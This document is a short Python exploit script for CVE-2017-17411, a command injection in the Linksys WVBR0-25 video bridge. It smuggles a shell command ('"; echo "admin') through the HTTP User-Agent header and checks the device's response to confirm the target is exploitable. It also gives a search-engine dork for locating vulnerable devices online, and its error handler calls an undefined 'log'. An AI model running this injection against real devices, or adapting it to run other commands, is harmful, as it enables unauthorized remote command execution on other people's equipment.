#!/usr/bin/python
# -*- coding: utf-8 -*-

# Author: Nixawk
# CVE-2017-17411
# Linksys WVBR0 25 Command Injection

"""
$ python2.7 exploit-CVE-2017-17411.py
[*] Usage: python exploit-CVE-2017-17411.py <URL>

$ python2.7 exploit-CVE-2017-17411.py http://example.com/
[+] Target is exploitable by CVE-2017-17411
"""

import requests


def check(url):
    payload = '"; echo "admin'
    md5hash = "456b7016a916a4b178dd72b947c152b7"  # echo "admin" | md5sum

    resp = send_http_request(url, payload)

    if not resp:
        return False

    lines = resp.text.splitlines()
    sys_cmds = filter(lambda x: "config.webui sys_cmd" in x, lines)

    if not any([payload in sys_cmd for sys_cmd in sys_cmds]):
        return False

    if not any([md5hash in sys_cmd for sys_cmd in sys_cmds]):
        return False

    print("[+] Target is exploitable by CVE-2017-17411 ")
    return True


def send_http_request(url, payload):
    headers = {
        'User-Agent': payload
    }

    response = None
    try:
        response = requests.get(url, headers=headers)
    except Exception as err:
        log.exception(err)

    return response


if __name__ == '__main__':
    import sys

    if len(sys.argv) != 2:
        print("[*] Usage: python %s <URL>" % sys.argv[0])
        sys.exit(0)

    check(sys.argv[1])


# google dork: "Vendor:LINKSYS ModelName:WVBR0-25-US"

## References

# https://www.thezdi.com/blog/2017/12/13/remote-root-in-directvs-wireless-video-bridge-a-tale-of-rage-and-despair
# https://thehackernews.com/2017/12/directv-wvb-hack.html